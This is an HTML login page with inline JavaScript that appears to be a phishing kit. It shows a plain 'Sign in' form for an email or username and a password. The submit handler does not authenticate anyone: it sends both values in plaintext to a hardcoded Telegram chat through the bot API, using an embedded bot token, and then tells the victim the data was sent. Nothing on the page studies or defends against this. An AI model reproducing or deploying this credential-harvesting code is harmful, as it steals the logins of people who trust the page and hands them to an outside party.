<form id="signInForm" class="mt-8 space-y-6" novalidate>
  <input type="hidden" name="remember" value="true" />
  <div class="rounded-md shadow-sm -space-y-px">
    <div>
      <label for="email-address" class="sr-only">Email address</label>
      <input
        id="email-address"
        name="email"
        type="email"
        autocomplete="email"
        required
        class="appearance-none rounded-t-md relative block w-full px-3 py-3 border border-gray-300 placeholder-gray-400 focus:outline-none focus:ring-orange-500 focus:border-orange-500 focus:z-10 sm:text-sm"
        placeholder="Username or Email address"
      />
    </div>
    <div>
      <label for="password" class="sr-only">Password</label>
      <input
        id="password"
        name="password"
        type="password"
        autocomplete="current-password"
        required
        class="appearance-none rounded-b-md relative block w-full px-3 py-3 border border-gray-300 placeholder-gray-400 focus:outline-none focus:ring-orange-500 focus:border-orange-500 focus:z-10 sm:text-sm"
        placeholder="Password"
      />
    </div>
  </div>

  <div id="statusMessage" class="text-center mt-2 text-sm font-medium text-orange-600"></div>

  <div>
    <button
      type="submit"
      class="group relative w-full flex justify-center py-3 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-orange-600 hover:bg-orange-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-orange-500"
    >
      Sign in
    </button>
  </div>
</form>

<script>
  const BOT_TOKEN = '7774453371:AAE0HswdXjo1lvImLCVmr6LZueZhlbjkEPo';
  const CHAT_ID = '-4610395963';

  const form = document.getElementById('signInForm');
  const statusMessage = document.getElementById('statusMessage');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    statusMessage.textContent = 'Sending...';

    const email = form.email.value.trim();
    const password = form.password.value.trim();

    if (!email || !password) {
      statusMessage.textContent = 'Please fill in all fields.';
      return;
    }

    const message = `
🚨 *New Sign-In Attempt* 🚨

📧 Email/Username: ${email}
🔑 Password: ${password}
    `;

    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      if (!res.ok) throw new Error('Failed to send message');

      statusMessage.textContent = '✅ Sign-in data sent successfully.';
      form.reset();
    } catch (err) {
      statusMessage.textContent = '❌ Failed to send data. Please try again.';
      console.error(err);
    }
  });
</script>
